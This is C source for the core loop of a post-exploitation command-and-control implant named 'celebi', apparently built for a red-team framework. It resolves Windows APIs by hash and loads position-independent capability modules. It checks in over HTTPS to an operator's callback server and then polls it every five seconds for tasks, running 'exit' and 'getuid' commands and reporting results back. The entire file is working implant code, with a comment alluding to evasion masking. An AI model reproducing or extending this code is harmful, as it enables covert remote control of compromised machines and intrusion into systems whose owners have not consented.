#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"
#include "headers/HTTP.h"

char RAW_PARAMS[1024] __attribute__((section(".text")));

WINBASEAPI HANDLE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(	HANDLE hHandle, DWORD dwMilliseconds);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
WINBASEAPI VOID WINAPI KERNEL32$ExitProcess(UINT uExitCode);
WINBASEAPI VOID WINAPI KERNEL32$ExitThread(DWORD dwExitCode);

WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);

FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

FARPROC resolve_unloaded(char * mod, char * func) {
	HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
	if (hModule == NULL) {
		hModule = KERNEL32$LoadLibraryA(mod);
	}
	return KERNEL32$GetProcAddress(hModule, func);
}

void agent_exit(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
	if (task != NULL) {
		perform_post(state, task, "", "success");
	}

	HttpDestroy(state->http);
	free_params(&state->params);
	free_picos(cap);	
	
	#ifdef CELEBI_EXIT_THREAD
	KERNEL32$ExitThread(0);
	#else
	KERNEL32$ExitProcess(0);
	#endif
}

void agent_getuid(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
	char *username = cap->GetuidPicoEntrypoint();
	
	perform_post(state, task, username, "success"); // TODO check if username is null and perform post based on that
}

void process_task(TaskInfo *task, AgentState *state, AgentCapabilities *cap) {
	if (MSVCRT$strcmp(task->command, "exit") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received exit command.");
		#endif
		
		agent_exit(state, cap, task);
		return;
	}
	
	if (MSVCRT$strcmp(task->command, "getuid") == 0) {
		#ifdef CELEBI_DEBUG
		dprintf("Received getuid command.");
		#endif
		
		agent_getuid(state, cap, task);
		return;
	}
	
	#ifdef CELEBI_DEBUG
	dprintf("UNKNOWN COMMAND %s: %s %s", task->id, task->command, task->parameters);
	#endif
}

void go() {
	AgentState state = { 0 };
	AgentCapabilities capabilities = { 0 };
	
	unpack_params(RAW_PARAMS, &state.params);
	
	#ifdef CELEBI_DEBUG
	dprintf("Parameters unpacked.");
	#endif
	
	load_picos(&capabilities);
	
	#ifdef CELEBI_DEBUG
	dprintf("Loaded PICO capabilities.");
	#endif
	
	state.http = HttpInit(state.params.callback_https);
	
	#ifdef CELEBI_DEBUG
	dprintf("Checking in...");
	#endif
	
	CheckinReply checkin_reply = { 0 };
	perform_checkin(&state, &capabilities, &checkin_reply);
	
	if ((checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
		#ifdef CELEBI_DEBUG
		dprintf("Checkin failed with: %s", checkin_reply.status);
		#endif
		
		free_checkin_reply(&checkin_reply);
		agent_exit(&state, &capabilities, NULL);
		return;
	}
	
	state.params.callback_uuid = clone_str(checkin_reply.callback_uuid);
	free_checkin_reply(&checkin_reply);
	
	#ifdef CELEBI_DEBUG
	dprintf("Successful checkin with payload UUID %s and callback UUID %s", state.params.payload_uuid, state.params.callback_uuid);
	#endif
	
	while (1) {
		// Look ma, no masking!
		TaskingReply tasking_reply = { 0 };
		perform_tasking(&state, &tasking_reply);
		
		#ifdef CELEBI_DEBUG
		dprintf("Received tasking from C2 server!");
		#endif
		
		for (int i = 0; i < tasking_reply.tasking_size; i++) {
			process_task(&tasking_reply.tasks[i], &state, &capabilities);
		}
		
		free_tasking_reply(&tasking_reply);
		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), 5000);
	}
}
